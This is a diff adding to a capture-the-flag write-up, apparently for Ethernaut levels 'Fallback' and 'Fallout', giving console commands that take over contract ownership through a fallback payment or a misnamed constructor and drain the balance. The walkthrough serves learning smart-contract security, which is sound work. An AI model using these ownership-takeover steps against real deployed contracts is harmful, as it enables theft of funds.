@@ -44,11 +44,15 @@ Submit the instance by clicking the orange button.
 ## 1. Fallback
 ```
 > contract.contribute({value:toWei("0.0001", "ether")})
+
 > web3.eth.sendTransaction({to:"0x3D585bb9145ca9101D5EdA79E138D854242FF90C", 
 	value:toWei("0.0001", "ether"), from:"0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"})
+	
 > contract.owner()
 < [[PromiseResult]]: "0x76F2CCD13DB4D70DFB2114704BD9d4d6326bafA0"
+
 > contract.withdraw()
+
 > getBalance("0x3D585bb9145ca9101D5EdA79E138D854242FF90C")
 < [[PromiseResult]]: "0"
 ```
@@ -56,6 +60,14 @@ Submit the instance by clicking the orange button.
 Submit the instance by clicking the orange button.
 
 ```\,,/(◣_◢)\,,/ Well done, You have completed this level!!!```
+
+## 2. Fallout
+```
+> contract.Fal1out()
+```
+Submit Instance
+
+```☜Ҩ.¬_¬.Ҩ☞ Well done, You have completed this level!!!```
 
 
 
